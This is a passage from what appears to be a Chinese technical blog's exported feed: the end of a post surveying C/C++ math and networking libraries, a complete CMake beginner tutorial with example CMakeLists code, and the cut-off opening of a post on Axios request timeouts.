<h1 id="数学库"><a href="#数学库" class="headerlink" title="数学库"></a>数学库</h1><h2 id="gsl（GNU-Scientific-Library）-GUN科学运算库"><a href="#gsl（GNU-Scientific-Library）-GUN科学运算库" class="headerlink" title="gsl（GNU Scientific Library）:GUN科学运算库"></a>gsl（GNU Scientific Library）:GUN科学运算库</h2><h2 id="Blitz-高效率的数值计算函数库"><a href="#Blitz-高效率的数值计算函数库" class="headerlink" title="Blitz++:高效率的数值计算函数库"></a>Blitz++:高效率的数值计算函数库</h2><p>它的设计目的是希望建立一套既具像C++ 一样方便，同时又比Fortran速度更快的数值计算环境。通常，用C++所写出的数值程序， 比 Fortran慢20%左右，因此Blitz++正是要改掉这个缺点。方法是利用C++的template 技术，程序执行甚至可以比Fortran更快。</p>
<h2 id="MTL-Matrix-Template-Library-矩阵模板库"><a href="#MTL-Matrix-Template-Library-矩阵模板库" class="headerlink" title="MTL(Matrix Template Library):矩阵模板库"></a>MTL(Matrix Template Library):矩阵模板库</h2><p>专注于线性代数相关的计算任务，如各种形式矩阵的生成(对角，共轭，稀疏，对称等)，相关的计算，变换，以及与一维向量的运算。</p>
<h2 id="POOMA"><a href="#POOMA" class="headerlink" title="POOMA"></a>POOMA</h2><p>一个免费的高性能的C++库，用于处理并行式科学计算。POOMA的面向对象设计方便了快速的程 序开发，对并行机器进行了优化以达到最高的效率，方便在工业和研究环境中使用。</p>
<h2 id="CGAL：计算几何算法库"><a href="#CGAL：计算几何算法库" class="headerlink" title="CGAL：计算几何算法库"></a>CGAL：计算几何算法库</h2><p>Computational Geometry Algorithms Library的目的是把在计 算几何方面的大部分重要的解决方案和方法以C++库的形式提供给工业和学术界的用户。<br>是一个大型C + +库的几何数据结构和算法，如Delaunay三角网，网格生成，布尔运算的多边形，以及各种几何处理算法。 CGAL是用来在各个领域：计算机图形学，科学可视化，计算机辅助设计与建模，地理信息系统，分子生物学，医学影像学，机器人学和运动规划，和数值方法。</p>
<h2 id="Matlab的开源高仿-Octave"><a href="#Matlab的开源高仿-Octave" class="headerlink" title="Matlab的开源高仿 Octave"></a>Matlab的开源高仿 Octave</h2><p>旨在解决线性和非线性的数值计算问题。也是跨平台的，源码中用了大量m4语言。</p>
<h2 id="C-符号计算库-GiNaC"><a href="#C-符号计算库-GiNaC" class="headerlink" title="C++符号计算库 GiNaC"></a>C++符号计算库 GiNaC</h2><h2 id="Eigen-目前较活跃"><a href="#Eigen-目前较活跃" class="headerlink" title="Eigen -目前较活跃"></a>Eigen -目前较活跃</h2><p>线性代数、矩阵、向量操作等运算的C++库。推荐使用。</p>
<h2 id="C-C-数值计算库-mygsl"><a href="#C-C-数值计算库-mygsl" class="headerlink" title="C/C++数值计算库 mygsl"></a>C/C++数值计算库 mygsl</h2><p>mygsl是一个基于GSL库的个性化开源数值计算项目.</p>
<h2 id="IMSL"><a href="#IMSL" class="headerlink" title="IMSL"></a>IMSL</h2><p>软件名称 IMSL C Numerical Library(不兼容vc6 编译器)。</p>
<p>分为统计库和数学库两部分。数学库包含应用数学和特殊函数。IMSL 程序库已成为数值分析解决方案的工业标准。 IMSL 程序库提供最完整与最值得信赖的函数库。 IMSL 数值程序库提供目前世界上最广泛被使用的 IMSL 算法，有超过 370 验证过、最正确与 thread-safe 的数学与统计程序。 IMSL FORTRAN 程序库提供新一代以 FORTRAN 90 为程序库基础的程序，能展现出最佳化的演算法能力应用于多处理器与其它高效能运算系统。</p>
<h1 id="网络库"><a href="#网络库" class="headerlink" title="网络库"></a>网络库</h1><h2 id="ACE"><a href="#ACE" class="headerlink" title="ACE"></a>ACE</h2><p>庞大、复杂，适合大型项目。开源、免费，不依赖第三方库，支持跨平台。</p>
<h2 id="Asio"><a href="#Asio" class="headerlink" title="Asio"></a>Asio</h2><p>Asio基于Boost开发的异步IO库，封装了Socket，简化基于socket程序的开发。</p>
<p>开源、免费，支持跨平台。</p>
<h2 id="POCO"><a href="#POCO" class="headerlink" title="POCO"></a>POCO</h2><p>POCO C++ Libraries 提供一套 C++ 的类库用以开发基于网络的可移植的应用程序，功能涉及线程、线程同步、文件系统访问、流操作、共享库和类加载、套接字以及网络协议包括：HTTP、 FTP、SMTP 等；其本身还包含一个 HTTP 服务器，提供 XML 的解析和 SQL 数据库的访问接口。POCO库的模块化、高效的设计及实现使得POCO特别适合嵌入式开发。在嵌入式开发领域，由于C++既适合底层（设备I/O、中断处理等）和高层面向对象开发，越来越流行。</p>
<h2 id="libevent"><a href="#libevent" class="headerlink" title="libevent"></a>libevent</h2><p>Libevent是一个轻量级的开源高性能网络库，从它的官网标题：libevent-an event notification library就能知道它的机制是采用事件触发，封装了以下三种事件的响应:IO事件,定时器事件,信号事件。select模型来实现跨平台的操作，Windows环境下支持IOCP。Google的开源WEB浏览器Chromium在Mac和Linux版本中，也使用了Libevent，足见该库的质量。</p>
<h2 id="libev"><a href="#libev" class="headerlink" title="libev"></a>libev</h2><p>libev和libevent很像，按照作者的介绍，可以作为libevent的替代者，能够提供更高的性能。</p>
<p>libev是一个高性能事件循环，所实现的功能就是一个强大的reactor。</p>
<h2 id="c-sockets-library"><a href="#c-sockets-library" class="headerlink" title="c++ sockets library"></a>c++ sockets library</h2><p>封装了sockets C API的C++类库。</p>
<p>支持SSL, IPv6, tcp 和 udp sockets, sctp sockets, http协议, 高度可定制的错误处理。</p>
<h2 id="libcurl"><a href="#libcurl" class="headerlink" title="libcurl"></a>libcurl</h2><p>libcurl是免费的轻量级的客户端网络库，支持DICT, FILE, FTP, FTPS, Gopher, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, POP3, POP3S, RTMP, RTSP, SCP, SFTP, SMTP, SMTPS, Telnet, TFTP. 支持SSL, HTTP POST, HTTP PUT, FTP上传, HTTP form上传，代理，cookies, 用户名与密码认证。</p>
<p>如果你开发的是客户端，libcurl是一个不错的选择。</p>
<h2 id="clsocket"><a href="#clsocket" class="headerlink" title="clsocket"></a>clsocket</h2><p>clsocket是一组轻量级的类，允许开发人员实现基于IP的网络程序。这个编译简单而且用起来也简单，推荐使用。</p>
<h1 id="日志库"><a href="#日志库" class="headerlink" title="日志库"></a>日志库</h1><h2 id="spdlog"><a href="#spdlog" class="headerlink" title="spdlog"></a>spdlog</h2><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.jianshu.com/p/2ba19ad64211" target="_blank" rel="noopener">C++数学库</a>,by xigua1234.</li>
<li><a href="https://blog.csdn.net/SSYITwin/article/details/83016844" target="_blank" rel="noopener">c++中关于M_PI，M_E的解释和使用，以及参考值</a>,by SYITwin.</li>
<li><a href="https://github.com/ampl/gsl" target="_blank" rel="noopener">GSL with CMake build support</a>,by ampl.</li>
<li><a href="https://th0masxu.gq/index.php/archives/224" target="_blank" rel="noopener">在Visual Studio中使用GNU Scientific Library (GSL)</a>,by NULL_BOT.</li>
<li><a href="https://blog.csdn.net/weiwangchao_/article/details/8730199" target="_blank" rel="noopener">开源免费的C/C++网络库(c/c++ sockets library) 七剑下天山</a>,by 工程师WWW.</li>
<li><a href="https://www.jianshu.com/p/ee5b34870eba" target="_blank" rel="noopener">值得推荐的C/C++框架和库 (真的很强大)</a>,by tibet889.</li>
<li><a href="https://zhuanlan.zhihu.com/p/71707672" target="_blank" rel="noopener">有哪些值得推荐的c/c++开源框架与库</a>,by 零声学院.</li>
<li><a href="https://cloud.tencent.com/developer/article/1524260" target="_blank" rel="noopener">C++ std::isnan等函数的使用</a>,by ccf19881030.</li>
<li><a href="https://developer.aliyun.com/article/47592" target="_blank" rel="noopener">C/C++log日志库比较</a>,by shy丶gril.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>CMake使用入门教程</title>
    <url>/2019/11/16/CMake%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>近几年美国对中国的科技封杀十分严重，说不定哪天Windows操作系统就不让我们用了。因此，在构建C/C++项目时应考虑跨平台，哪天不让用Windows了，可以请容易的将项目移植到Linux上。不同系统平台有不同的C/C++编译器，不同编译器有不同的构建规则，针对每个平台的不同编译器编写构建规则十分复杂，幸好有CMake可简化构建规则的编写，实现一次编写，不同平台适用。下面简单介绍CMake的使用。</p>
<h1 id="CMake简介"><a href="#CMake简介" class="headerlink" title="CMake简介"></a>CMake简介</h1><p>代码变成可执行文件，叫做编译（compile）；先编译这个，还是先编译那个（即编译的安排），叫做构建（build）。</p>
<p>Make是最常用的构建工具，诞生于1977年，主要用于C语言的项目。但是实际上 ，任何只要某个文件有变化，就要重新构建的项目，都可以用Make构建。</p>
<p>Make工具有很多，例如 GNU Make ，QT 的 qmake ，微软的 MS nmake，BSD Make（pmake），Makepp，等等。这些 Make 工具遵循着不同的规范和标准，所执行的 Makefile 格式也千差万别。这样就带来了一个严峻的问题：如果软件想跨平台，必须要保证能够在不同平台编译。而如果使用上面的 Make 工具，就得为每一种标准写一次 Makefile ，这将是一件让人抓狂的工作。</p>
<p>CMake就是针对上面问题所设计的工具：它首先允许开发者编写一种平台无关的 CMakeList.txt 文件来定制整个编译流程，然后再根据目标用户的平台进一步生成所需的本地化 Makefile 和工程文件，如 Unix 的 Makefile 或 Windows 的 Visual Studio 工程。从而做到“Write once, run everywhere”。显然，CMake 是一个比上述几种 make 更高级的编译配置工具。一些使用 CMake 作为项目架构系统的知名开源项目有 VTK、ITK、KDE、OpenCV、OSG 等。</p>
<h1 id="CMake教程入门"><a href="#CMake教程入门" class="headerlink" title="CMake教程入门"></a>CMake教程入门</h1><h2 id="给工程起个名字"><a href="#给工程起个名字" class="headerlink" title="给工程起个名字"></a>给工程起个名字</h2><p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">project(&lt;PROJECT-NAME&gt; [LANGUAGES] [&lt;language-name&gt;...])</span><br></pre></td></tr></table></figure>

<p>该指令定义工程名称。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">project(UtilTool)</span><br></pre></td></tr></table></figure>

<h2 id="添加头文件目录INCLUDE-DIRECTORIES"><a href="#添加头文件目录INCLUDE-DIRECTORIES" class="headerlink" title="添加头文件目录INCLUDE_DIRECTORIES"></a>添加头文件目录INCLUDE_DIRECTORIES</h2><p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include_directories([AFTER|BEFORE] [SYSTEM] dir1 [dir2 ...])</span><br></pre></td></tr></table></figure>

<p>它相当于g++选项中的-I参数的作用，也相当于环境变量中增加路径到CPLUS_INCLUDE_PATH变量的作用。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include_directories($&#123;CMAKE_CURRENT_LIST_DIR&#125;&#x2F;include)</span><br></pre></td></tr></table></figure>

<p>当头文件分散在不同层次和深度的目录中时，逐个使用include_directories命令添加包含目录十分麻烦，可使用如下方法递归加载各个目录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MARO(HEADER_DIRECTORIES return_list)</span><br><span class="line">    FILE(GLOB_RECURSE new_list src&#x2F;*.h)</span><br><span class="line">    SET(dir_list &quot;&quot;)</span><br><span class="line">    FOREACH(file_path $&#123;new_list&#125;)</span><br><span class="line">        GET_FILENAME_COMPONENT(dir_path $&#123;file_path&#125; PATH)</span><br><span class="line">        SET(dir_list $&#123;dir_list&#125; $&#123;dir_path&#125;)</span><br><span class="line">    ENDFOREACH()</span><br><span class="line">    LIST(REMOVE_DUPLICATES dir_list)</span><br><span class="line">    SET($&#123;return_list&#125; $&#123;dir_list&#125;)</span><br><span class="line">ENDMACRO()</span><br><span class="line"></span><br><span class="line">HEADER_DIRECTORIES(header_dir_list)</span><br><span class="line">include_directories($&#123;CMAKE_CURRENT_LIST_DIR&#125;&#x2F;include $&#123;header_dir_list&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="添加需要链接的库文件目录LINK-DIRECTORIES"><a href="#添加需要链接的库文件目录LINK-DIRECTORIES" class="headerlink" title="添加需要链接的库文件目录LINK_DIRECTORIES"></a>添加需要链接的库文件目录LINK_DIRECTORIES</h2><p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">link_directories(directory1 directory2 ...)</span><br></pre></td></tr></table></figure>

<p>它相当于g++命令的-L选项的作用，也相当于环境变量中增加LD_LIBRARY_PATH的路径的作用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">link_directories($&#123;CMAKE_CURRENT_LIST_DIR&#125;&#x2F;lib)</span><br></pre></td></tr></table></figure>

<h2 id="向当前工程添加存放源文件的子目录ADD-SUBDIRECTORY"><a href="#向当前工程添加存放源文件的子目录ADD-SUBDIRECTORY" class="headerlink" title="向当前工程添加存放源文件的子目录ADD_SUBDIRECTORY"></a>向当前工程添加存放源文件的子目录ADD_SUBDIRECTORY</h2><p>ADD_SUBDIRECTORY用于向当前工程添加存放源文件的子目录，并可以指定中间二进制和目标二进制存放的位置。语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ADD_SUBDIRECTORY(source_dir [binary_dir]</span><br><span class="line">                  [EXCLUDE_FROM_ALL])</span><br></pre></td></tr></table></figure>

<p>上面的例子定义了将 src 子目录加入工程，并指定了编译输出路径为 bin 目录。如果不指定 bin 目录，那么编译的结果都将存放在 build/src 目录。</p>
<h2 id="设置要链接的库文件的名称TARGET-LINK-LIBRARIES"><a href="#设置要链接的库文件的名称TARGET-LINK-LIBRARIES" class="headerlink" title="设置要链接的库文件的名称TARGET_LINK_LIBRARIES"></a>设置要链接的库文件的名称TARGET_LINK_LIBRARIES</h2><p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">target_link_libraries(&lt;target&gt; [item1 [item2 [...]]]</span><br><span class="line">                      [[debug|optimized|general] &lt;item&gt;] ...)</span><br></pre></td></tr></table></figure>

<p>该指令的作用为将目标文件与库文件进行链接。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TARGET_LINK_LIBRARIES(utiltool-example utiltool)</span><br></pre></td></tr></table></figure>

<h2 id="为工程生成目标文件"><a href="#为工程生成目标文件" class="headerlink" title="为工程生成目标文件"></a>为工程生成目标文件</h2><p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add_executable(&lt;name&gt; [WIN32] [MACOSX_BUNDLE]</span><br><span class="line">               [EXCLUDE_FROM_ALL]</span><br><span class="line">               source1 [source2 ...])</span><br></pre></td></tr></table></figure>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ADD_EXECUTABLE(utiltool-example examples&#x2F;ConverterTest.cpp)</span><br></pre></td></tr></table></figure>

<h2 id="为工程生成共享库"><a href="#为工程生成共享库" class="headerlink" title="为工程生成共享库"></a>为工程生成共享库</h2><p>语法:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add_library(&lt;name&gt; [STATIC | SHARED | MODULE]</span><br><span class="line">            [EXCLUDE_FROM_ALL]</span><br><span class="line">            [source1] [source2] [...])</span><br></pre></td></tr></table></figure>

<p>该指令的主要作用就是将指定的源文件生成链接文件，然后添加到工程中去。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ADD_LIBRARY(utiltool SHARED $&#123;UTILTOOL_SOURCES&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="为工程制作简单的安装脚本"><a href="#为工程制作简单的安装脚本" class="headerlink" title="为工程制作简单的安装脚本"></a>为工程制作简单的安装脚本</h2><p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">install(TARGETS targets... [EXPORT &lt;export-name&gt;]</span><br><span class="line">          [[ARCHIVE|LIBRARY|RUNTIME|FRAMEWORK|BUNDLE|</span><br><span class="line">            PRIVATE_HEADER|PUBLIC_HEADER|RESOURCE]</span><br><span class="line">           [DESTINATION &lt;dir&gt;]</span><br><span class="line">           [PERMISSIONS permissions...]</span><br><span class="line">           [CONFIGURATIONS [Debug|Release|...]]</span><br><span class="line">           [COMPONENT &lt;component&gt;]</span><br><span class="line">           [OPTIONAL] [NAMELINK_ONLY|NAMELINK_SKIP]</span><br><span class="line">          ] [...])</span><br></pre></td></tr></table></figure>

<p>该命令为一个工程生成安装规则。TARGETS格式的install命令规定了安装工程中的目标（targets）的规则。有5中可以被安装的目标文件：ARCHIVE，LIBRARY，RUNTIME，FRAMEWORK，和BUNDLE。静态链接的库文件总是被当做ARCHIVE目标。模块库总是被当做LIBRARY目标。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">install(TARGETS utiltool </span><br><span class="line">        RUNTIME DESTINATION bin</span><br><span class="line">        ARCHIVE DESTINATION lib </span><br><span class="line">        LIBRARY DESTINATION lib)</span><br><span class="line">install(FILES $&#123;UTILTOOL_HEADERS&#125; DESTINATION include)</span><br></pre></td></tr></table></figure>

<h2 id="为工程设置变量"><a href="#为工程设置变量" class="headerlink" title="为工程设置变量"></a>为工程设置变量</h2><p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set(&lt;variable&gt; &lt;value&gt;</span><br><span class="line">    [[CACHE &lt;type&gt; &lt;docstring&gt; [FORCE]] | PARENT_SCOPE])</span><br></pre></td></tr></table></figure>

<p>该指令用于给一般变量，缓存变量，环境变量赋值。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># set up versioning.</span><br><span class="line">set(BUILD_MAJOR &quot;1&quot;)</span><br><span class="line">set(BUILD_MINOR &quot;0&quot;)</span><br><span class="line">set(BUILD_VERSION &quot;0&quot;)</span><br><span class="line">set(BUILD_VERSION $&#123;BUILD_MAJOR&#125;.$&#123;BUILD_MINOR&#125;.$&#123;BUILD_VERSION&#125;)</span><br><span class="line"></span><br><span class="line">SET(UTILTOOL_HEADERS</span><br><span class="line">src&#x2F;GeodeticConverter.h</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">SET(UTILTOOL_SOURCES</span><br><span class="line">src&#x2F;GeodeticConverter.cpp</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h2 id="为工程设置预定义宏"><a href="#为工程设置预定义宏" class="headerlink" title="为工程设置预定义宏"></a>为工程设置预定义宏</h2><p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add_definitions(-DFOO -DBAR ...)</span><br></pre></td></tr></table></figure>

<p>该指令添加编译参数。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 添加WIN32宏定义</span><br><span class="line">add_definitions(-DWIN32)</span><br></pre></td></tr></table></figure>

<h2 id="OPTION变量"><a href="#OPTION变量" class="headerlink" title="OPTION变量"></a>OPTION变量</h2><p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">option(&lt;option_variable&gt; &quot;help string describing option&quot;</span><br><span class="line">            [initial value])</span><br></pre></td></tr></table></figure>
<p>该指令提供一个用户可以任选的选项，可在之后由用户通过CMake的GUI或者命令行进行更改。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OPTION(UTILTOOL_EXAMPLES &quot;Build the examples&quot; ON)</span><br></pre></td></tr></table></figure>

<h1 id="修改默认的CMAKE-MODULE-PATH目录"><a href="#修改默认的CMAKE-MODULE-PATH目录" class="headerlink" title="修改默认的CMAKE_MODULE_PATH目录"></a>修改默认的CMAKE_MODULE_PATH目录</h1><p>CMAKE_MODULE_PATH是供find_package搜索第三方库用的。cmake的默认Modules目录在安装目录中：cmake-3.11.3-win64-x64\share\cmake-3.11\Modules。<br>如果要追加Modules目录，有3种方式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SET(CMAKE_MODULE_PATH &quot;$&#123;OpenSceneGraph_SOURCE_DIR&#125;&#x2F;CMakeModules;$&#123;CMAKE_MODULE_PATH&#125;&quot;)</span><br><span class="line"></span><br><span class="line">LIST(APPEND CMAKE_MODULE_PATH &quot;$&#123;CMAKE_SOURCE_PREFIX&#125;&quot;)</span><br><span class="line"></span><br><span class="line">set(CMAKE_MODULE_PATH $&#123;CMAKE_MODULE_PATH&#125; $&#123;CMAKE_CURRENT_SOURCE_DIR&#125;&#x2F;cmake)</span><br></pre></td></tr></table></figure>

<h1 id="find-package用法"><a href="#find-package用法" class="headerlink" title="find_package用法"></a>find_package用法</h1><p>通常情况下，包含第三方库需要写以下内容:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include_directories(&quot;$&#123;project_root_path&#125;&#x2F;include&#x2F;&quot;)  </span><br><span class="line">link_directories(.&#x2F;lib)</span><br><span class="line">add_executable(myapp myapp.cpp)</span><br><span class="line">target_link_libraries(myapp mylib)</span><br></pre></td></tr></table></figure>

<p>如果引用的很多个第三方库，那么类似上面的内容会写很多，且如果自己的多个项目都引用了某个第三方库，那么我每个项目的CmakeList.txt都得写一遍，重复劳动很多。那么有没办法为每个第三方库只定义一次它的头文件和库文件信息，然后在自己的工程中只指定名称即可？（类似编译Java的Maven仓库）答案是当然可以，find_package帮你解决。</p>
<p>find_package定义在自己工程的CmakeList.txt中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find_package( XXX CONFIG REQUIRED )</span><br></pre></td></tr></table></figure>

<p>然后cmake就会在默认的Modules(即CMAKE_MODULE_PATH指定的目录)目录中搜索这个XXX第三方库。</p>
<p>搜索有两种模式：FindXXX.cmake和XXXConfig.cmake。前者叫做Module模式，后者叫做Config模式。</p>
<h1 id="优雅的软件项目结构模板"><a href="#优雅的软件项目结构模板" class="headerlink" title="优雅的软件项目结构模板"></a>优雅的软件项目结构模板</h1><p>请参考<a href="https://segmentfault.com/a/1190000022075547" target="_blank" rel="noopener">CMake—优雅地构建软件项目实践(1)</a>。</p>
<h1 id="完整简单示例"><a href="#完整简单示例" class="headerlink" title="完整简单示例"></a>完整简单示例</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># CMakeList.txt: UtilTool 的 CMake 项目，在此处包括源代码并定义</span><br><span class="line"># 项目特定的逻辑。</span><br><span class="line">#</span><br><span class="line">cmake_minimum_required (VERSION 3.8)</span><br><span class="line"></span><br><span class="line">project(UtilTool)</span><br><span class="line"></span><br><span class="line"># set up versioning.</span><br><span class="line">set(BUILD_MAJOR &quot;1&quot;)</span><br><span class="line">set(BUILD_MINOR &quot;0&quot;)</span><br><span class="line">set(BUILD_VERSION &quot;0&quot;)</span><br><span class="line">set(BUILD_VERSION $&#123;BUILD_MAJOR&#125;.$&#123;BUILD_MINOR&#125;.$&#123;BUILD_VERSION&#125;)</span><br><span class="line"></span><br><span class="line">include_directories($&#123;CMAKE_CURRENT_LIST_DIR&#125;&#x2F;include)</span><br><span class="line"></span><br><span class="line">link_directories($&#123;CMAKE_CURRENT_LIST_DIR&#125;&#x2F;lib)</span><br><span class="line"></span><br><span class="line">link_libraries(gsl)</span><br><span class="line"></span><br><span class="line"># OS and compiler checks. </span><br><span class="line">if(UNIX)</span><br><span class="line">    # linux &#x2F; normal unix</span><br><span class="line">    add_definitions(-D_LINUX)</span><br><span class="line">    if(CYGWIN)</span><br><span class="line">        # Special Cygwin stuff here</span><br><span class="line">    elseif(APPLE)</span><br><span class="line">        # Special Apple stuff here</span><br><span class="line">        remove_definitions(-D_LINUX)</span><br><span class="line">        add_definitions(-D_DARWIN)</span><br><span class="line">    endif()</span><br><span class="line">elseif(WIN32)</span><br><span class="line">    add_definitions(-DWIN32)</span><br><span class="line">    add_definitions(-D UtilTool_EXPORTS)</span><br><span class="line">    if(MINGW)</span><br><span class="line">        # Special MINGW stuff here</span><br><span class="line">    elseif(MSVC)</span><br><span class="line">        # Special MSVC stuff here</span><br><span class="line">        add_definitions(-D_WINSOCK_DEPRECATED_NO_WARNINGS)</span><br><span class="line">    else()</span><br><span class="line">        # No idea what it is, but there&#39;s a good chance it&#39;s too weird.</span><br><span class="line">        MESSAGE( FATAL_ERROR &quot;Using unknown WIN32 compiler... NOT. Please add to build system.&quot; )</span><br><span class="line">    endif()</span><br><span class="line">endif()</span><br><span class="line"></span><br><span class="line">SET(UTILTOOL_HEADERS</span><br><span class="line">src&#x2F;GeodeticConverter.h</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">SET(UTILTOOL_SOURCES</span><br><span class="line">src&#x2F;GeodeticConverter.cpp</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># mark headers as headers...</span><br><span class="line">SET_SOURCE_FILES_PROPERTIES( $&#123;UTILTOOL_HEADERS&#125; PROPERTIES HEADER_FILE_ONLY TRUE )</span><br><span class="line"># append to sources so that dependency checks work on headers</span><br><span class="line">LIST(APPEND UTILTOOL_SOURCES $&#123;UTILTOOL_HEADERS&#125;)</span><br><span class="line"></span><br><span class="line">OPTION(UTILTOOL_SHARED &quot;Build utiltool lib as shared.&quot; ON)</span><br><span class="line">OPTION(UTILTOOL_DEP_ONLY &quot;Build for use inside other CMake projects as dependency.&quot; OFF)</span><br><span class="line"></span><br><span class="line"># 将源代码添加到此项目的共享库中。</span><br><span class="line">if(UTILTOOL_SHARED)</span><br><span class="line">    ADD_LIBRARY(utiltool SHARED $&#123;UTILTOOL_SOURCES&#125;)</span><br><span class="line">endif()</span><br><span class="line"></span><br><span class="line"># install into configured prefix</span><br><span class="line">if(NOT UTILTOOL_DEP_ONLY)</span><br><span class="line">    install(TARGETS utiltool </span><br><span class="line">        RUNTIME DESTINATION bin</span><br><span class="line">        ARCHIVE DESTINATION lib </span><br><span class="line">        LIBRARY DESTINATION lib)</span><br><span class="line">    install(FILES $&#123;UTILTOOL_HEADERS&#125; DESTINATION include)</span><br><span class="line">else()</span><br><span class="line"></span><br><span class="line">endif()</span><br><span class="line"></span><br><span class="line"># TODO: 如有需要，请添加测试并安装目标。</span><br><span class="line">OPTION(UTILTOOL_EXAMPLES &quot;Build the examples&quot; ON)</span><br><span class="line"></span><br><span class="line">if(UTILTOOL_EXAMPLES)</span><br><span class="line">    ADD_EXECUTABLE(utiltool-example examples&#x2F;ConverterTest.cpp)</span><br><span class="line">    TARGET_LINK_LIBRARIES(utiltool-example utiltool)</span><br><span class="line">endif()</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://huangwang.github.io/2019/03/20/Linux%E5%B9%B3%E5%8F%B0%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E6%B5%8B%E8%AF%95JSBSim/">Linux平台编译安装测试JSBSim</a>,by jackhuang.</li>
<li><a href="https://zhuanlan.zhihu.com/p/59450618" target="_blank" rel="noopener">干货：构建C/C++良好的工程结构</a>,by Froser.</li>
<li><a href="https://blog.csdn.net/yzx_zjut/article/details/80831900" target="_blank" rel="noopener">基于CMake构建系统的C++工程框架</a>,by  zhongxiao_yao.</li>
<li><a href="https://www.cnblogs.com/coderfenghc/archive/2012/08/12/2627561.html" target="_blank" rel="noopener">CMake 手册详解（十九）install指令</a>,by SirDigit.</li>
<li><a href="https://murphypei.github.io/blog/2018/10/cmake-variable" target="_blank" rel="noopener">CMake中变量总结</a>,by 拾荒志.</li>
<li><a href="https://juejin.im/post/5b3ecfef6fb9a04f8c5ebab5" target="_blank" rel="noopener">cmake使用教程（十）-关于file</a>,by saka.</li>
<li><a href="https://stackoverflow.com/questions/17653738/recursive-cmake-search-for-header-and-source-files" target="_blank" rel="noopener">Recursive CMake search for header and source files</a>,by stackoverflow.</li>
<li><a href="https://stackoverflow.com/questions/47251874/cmake-shared-library-in-subdirectory" target="_blank" rel="noopener">CMake shared library in subdirectory</a>,by stackoverflow.</li>
<li><a href="https://blog.leosocy.top/CMake%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">CMake 语言和语法</a>,by leosocy.</li>
<li><a href="https://zhuanlan.zhihu.com/p/82244559" target="_blank" rel="noopener">【cmake】——include_directories 和target_include_directories的区别</a>,by 大川搬砖.</li>
<li><a href="https://segmentfault.com/a/1190000022075547" target="_blank" rel="noopener">CMake—优雅地构建软件项目实践(1)</a>,by Ethan.</li>
<li><a href="https://blog.csdn.net/dxa572862121/article/details/117026551" target="_blank" rel="noopener">CMake测试</a>,by dxa572862121.</li>
<li><a href="https://www.cnblogs.com/narjaja/p/8351500.html" target="_blank" rel="noopener">CMake–Set用法</a>,by narjaja.</li>
<li><a href="https://blog.csdn.net/hp_cpp/article/details/110373926" target="_blank" rel="noopener">CMake之message()函数的使用和打印变量值</a>,by hp_cpp.</li>
<li><a href="https://mjmorse.com/blog/cmake-template/" target="_blank" rel="noopener">A minimal CMake project template</a>,by Matt Morse.</li>
<li><a href="https://dawnarc.com/2018/04/buildcmake%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE%E9%A1%B9/" target="_blank" rel="noopener">[Build]cmake常用配置项</a>,by 玄冬Wong.</li>
<li><a href="https://blog.csdn.net/qq_35097289/article/details/81169533" target="_blank" rel="noopener">简单介绍Cmake生成VS工程中的ALL_BUILD、INSTALL、ZERO_CHECK作用！！</a>,by 醉逍遥_祥.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Axios请求超时处理方法</title>
    <url>/2019/11/11/Axios%E8%AF%B7%E6%B1%82%E8%B6%85%E6%97%B6%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>Axios 是一个基于 promise 的 HTTP 库，可以用在浏览器和 node.js 中。Vue2官方推荐使用Axios执行HTTP请求和处理HTTP响应。Axios具有如下特征：</p>
<ul>
<li>从浏览器中创建 XMLHttpRequests</li>
